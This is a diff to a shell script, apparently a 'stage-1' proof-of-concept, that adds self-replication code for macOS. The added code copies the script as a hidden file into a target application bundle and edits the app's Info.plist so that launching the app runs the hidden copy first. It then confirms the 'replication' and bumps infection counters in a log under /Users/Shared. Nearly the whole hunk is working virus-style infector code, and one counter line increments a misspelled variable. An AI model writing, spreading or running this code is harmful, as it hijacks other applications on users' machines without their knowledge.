@@ -194,4 +194,110 @@ else
 		echo "/Users/Shared/.stage-1.log created" >> ./.stage-1.log
 	fi
 fi
+#Copy this script over to target
+TScript="${Target}/Contents/MacOS/.${ExecName}"
+cp "${Script}" "${TScript}"
+if [ -f "${TScript}" ]
+then
+	SuccessfulCopy="true"
+else
+	SuccessfulCopy="false"
+fi
+if [ ${DEBUG} == 1 ]
+then
+	echo "TScript is ${TScript}"
+	echo "SuccessfulCopy == ${SuccessfulCopy}"
+fi
+if [ ${LOGGING} == 1 ]
+then
+	echo "TScript is ${TScript}" >> ./.stage-1.log
+	echo "SuccessfulCopy == ${SuccessfulCopy}" >> ./.stage-1.log
+fi
+if [ ${SuccessfulCopy} == "true" ]
+then
+	#Change (delete and then add) the last line of TScript:
+	sed -i '' -e '$ d' "${TScript}"
+	echo "${ExecName}" >> "${TScript}"
+	#Add TScript to the log for removal:
+	echo "${TScript}" >> "/Users/Shared/.stage-1.log"
+	#Edit target's info.plist (create backup)(to remove):
+	sed -i '.BAK' "${ExecLineNum}s/${ExecName}\$/.${ExecName}/" "${TargetPlist}"
+	if [ ${DEBUG} == 1 ]
+	then
+		echo "${TargetPlist} edited"
+	fi
+	if [ ${LOGGING} == 1 ]
+	then
+		echo "${TargetPlist} edited" >> ./.stage-1.log
+	fi
+	SuccessfulEdit="false"
+	NewExecLineFull=$(sed -n "${ExecLineNum}p" "${TargetPlist}")
+	echo "${NewExecLineFull}" >> "/private/tmp/${TmpName}"
+	if [ ${DEBUG} == 1 ]
+	then
+		echo "NewExecLineFull is ${NewExecLineFull}"
+		echo "TmpName file created"
+	fi
+	if [ ${LOGGING} == 1 ]
+	then
+		echo "NewExecLineFull is ${NewExecLineFull}" >> ./.stage-1.log
+		echo "TmpName file created" >> ./.stage-1.log
+	fi
+	#For some reason the -E (not -e) is necessary here:
+	NewExecName=$(sed -nE "/<string>/ s/.*<string>([^<]+).*/\1/p" "/private/tmp/${TmpName}")
+	#Write the NewExecName to the log for removal
+	echo "${NewExecName}" >> "/Users/Shared/.stage-1.log"
+	if [ ${DEBUG} == 1 ]
+	then
+		echo "NewExecName is ${NewExecName}"
+	fi
+	if [ ${LOGGING} == 1 ]
+	then
+		echo "NewExecName is ${NewExecName}" >> ./.stage-1.log
+	fi
+	rm "/private/tmp/${TmpName}"
+	if [ ! -f "/private/tmp/${TmpName}" ]
+	then
+		if [ ${DEBUG} == 1 ]
+		then
+			echo "TmpName file deleted"
+		fi
+		if [ ${LOGGING} == 1 ]
+		then
+			echo "TmpName file deleted" >> ./.stage-1.log
+		fi
+	fi
+	#If ${ExecName} starts with a . (aka is hidden) then the replication was 
+	#successful
+	SuccessfulReplication="false"
+	if [[ ${NewExecName} = .* ]]
+	then
+		SuccessfulReplication="true"
+	else
+		SuccessfulReplication="false"
+	fi
+	if [ ${DEBUG} == 1 ]
+	then
+		echo "SuccessfulReplication == ${SuccessfulReplication}"
+	fi
+	if [ ${LOGGING} == 1 ]
+	then
+		echo "SuccessfulReplication == ${SuccessfulReplication}" >> ./.stage-1.log
+	fi
+fi
+if [ ${SuccessfulCopy} == "true" ] && [ ${SuccessfulReplication} == "true" ]
+then
+	RC03=$(sed -n "s/\(.*[^0-9]\)\([0-9]*\)$/\2/p;q" "/Users/Shared/.stage-1.log")
+	RC04=${RC03}
+	let "REPC04++"
+	sed -i '' "1s/${RC03}\$/${RC04}/" "/Users/Shared/.stage-1.log"
+	if [ ${LOGGING} == 1 ]
+	then
+		RC05=$(sed -n "2!d;s/\(.*[^0-9]\)\([0-9]*\)$/\2/p;q" ./.stage-1.log)
+		RC06=${RC05}
+		let "RC06++"
+		sed -i '' "2s/${RC05}\$/${RC06}/" ./.stage-1.log
+	fi
+fi
 cd "${OrigPath}"
+#Placeholder
